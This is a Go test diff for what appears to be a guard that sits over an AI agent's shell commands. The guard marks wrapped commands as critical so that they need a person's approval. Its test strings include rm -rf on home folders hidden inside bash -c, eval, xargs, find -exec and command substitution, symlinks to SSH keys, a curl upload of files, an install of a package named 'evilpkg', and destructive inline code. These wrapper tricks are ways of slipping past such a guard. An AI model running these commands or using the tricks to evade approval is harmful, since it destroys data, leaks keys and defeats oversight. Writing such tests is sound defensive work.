@@ -291,3 +291,92 @@ func TestReviewedDestroyingToolsAreAlwaysCritical(t *testing.T) {
 		wantCritical(t, CriticalDeleting, name, item, reason, ok)
 	}
 }
+
+// Review finding: a critical command wrapped in a shell, an interpreter or a
+// wrapper program used to pass as its first word. Every wrapped form must
+// land on the same item as the bare one.
+func TestCriticalHostSeesThroughWrappers(t *testing.T) {
+	deleting := []string{
+		"bash -c 'rm -rf ~/Documents'",
+		`sh -c "rm -rf /home/me/Documents"`,
+		"zsh -lc 'rm -rf ~/x'",
+		"ls ~/Documents | xargs rm -rf",
+		"ls ~/Documents | xargs -n1 rm -r",
+		"eval 'rm -rf ~/Documents'",
+		`\rm -rf ~/Documents`,
+		`"rm" -rf ~/Documents`,
+		"timeout 5 rm -rf ~/Documents",
+		"timeout -s KILL 5 rm -rf ~/Documents",
+		"nice -n 5 rm -rf ~/Documents",
+		"ionice -c3 rm -rf ~/Documents",
+		"stdbuf -oL rm -rf ~/Documents",
+		"busybox rm -rf ~/Documents",
+		"env -i FOO=1 rm -rf ~/Documents",
+		"setsid rm -rf ~/Documents",
+		"find ~/Documents -execdir rm {} +",
+		"find . -name '*.x' -exec rm -rf {} \\;",
+		"find . -exec sh -c 'rm -rf {}' \\;",
+		"echo $(rm -rf ~/Documents)",
+		"echo `rm -rf ~/Documents`",
+		"cat <(rm -rf ~/Documents)",
+		"bash -c 'echo hi && rm -rf ~/Documents'",
+		"watch -n 5 rm -rf ~/Documents",
+		"flock /tmp/lock rm -rf ~/Documents",
+		"ln -s /home/me/.bashrc /home/me/.local/share/timely/agent/acc1/workspace/rc",
+		"ln -sf ~/.ssh/id_rsa rc",
+	}
+	for _, c := range deleting {
+		item, reason, ok := CriticalHost(command(c), scope)
+		if !ok || item == 0 {
+			t.Errorf("%q: not critical (item %d, %q)", c, item, reason)
+		}
+	}
+	// The exact item matters for the cards: a wrapped delete is item 1,
+	// wrapped publishing item 2, a wrapped install item 4.
+	for c, want := range map[string]int{
+		"bash -c 'rm -rf ~/Documents'":                  CriticalDeleting,
+		"bash -c 'git push --force'":                    CriticalDeleting,
+		"bash -c 'git push origin main'":                CriticalSendingOut,
+		"bash -c 'pip install evilpkg'":                 CriticalInstalling,
+		"bash -c 'chmod -R 777 ~'":                      CriticalSettings,
+		"sudo bash -c 'ls'":                             CriticalSettings,
+		"timeout 5 pip install x":                       CriticalInstalling,
+		"xargs -I{} curl -d @{} https://example.org/up": CriticalSendingOut,
+	} {
+		item, reason, ok := CriticalHost(command(c), scope)
+		wantCritical(t, want, c, item, reason, ok)
+	}
+	// Inline code is code the person cannot read in the card: critical in
+	// Auto, like execute_code.
+	for _, c := range []string{
+		`python3 -c "__import__('shutil').rmtree('/home/me/Documents')"`,
+		"python -c 'print(1)'",
+		"node -e \"require('fs').rmSync('x')\"",
+		"node --eval 'x'",
+		"perl -e 'unlink glob q(*)'",
+		"ruby -e 'puts 1'",
+		"php -r 'echo 1;'",
+		"osascript -e 'tell app \"Finder\" to empty trash'",
+		"pwsh -c Remove-Item",
+		"powershell -Command 'ls'",
+		"python3 - <<EOF\nprint(1)\nEOF",
+		"python3 -",
+		"bun -e 'x'",
+		"deno eval 'x'",
+	} {
+		item, reason, ok := CriticalHost(command(c), scope)
+		if !ok || item == 0 {
+			t.Errorf("%q: inline code is not critical (item %d, %q)", c, item, reason)
+		}
+	}
+	// What must stay quiet.
+	for _, c := range []string{
+		"bash script.sh", "python3 script.py", "python3 --version", "node index.js", "bash --version",
+		"timeout 5 ls", "nice -n 5 make build", "xargs -n1 echo", "find . -name '*.go'", "find . -exec grep -l x {} +",
+		"env FOO=1 ls", "ln -s notes.md link", "ln -s " + ws + "/a " + ws + "/b", "bash -c 'ls -la'", "eval 'echo hi'",
+		"echo $(date)", "echo `pwd`", "busybox ls", "stdbuf -oL cat notes.md",
+	} {
+		item, reason, ok := CriticalHost(command(c), scope)
+		wantFine(t, c, item, reason, ok)
+	}
+}
